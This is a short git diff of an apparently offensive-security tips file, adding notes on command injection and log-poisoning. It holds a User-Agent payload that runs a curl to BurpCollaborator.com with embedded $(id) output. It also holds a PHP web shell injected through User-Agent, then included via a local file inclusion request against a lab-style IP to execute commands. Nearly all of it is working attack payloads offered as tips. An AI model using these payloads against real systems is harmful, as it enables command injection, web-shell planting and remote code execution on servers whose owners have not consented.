@@ -36,11 +36,17 @@
    
 ## TIP-5 
 ```bash
-    User-Agent: `curl - v http://BurpCollaborator.com$(id)`
+ User-Agent: `curl - v http://BurpCollaborator.com$(id)`
  # Get command injection
  ```
-   
-   
+ 
+## Log poisoning LFI RCE
+```
+- Burp inject php code in User-Agent User-Agent: <?php system($_REQUEST['hack']); ?>
+- Check logs at /var/log/httpd-access.log
+- Use LFI to RCE 10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log&hack=uname
+```
+
    
    
    
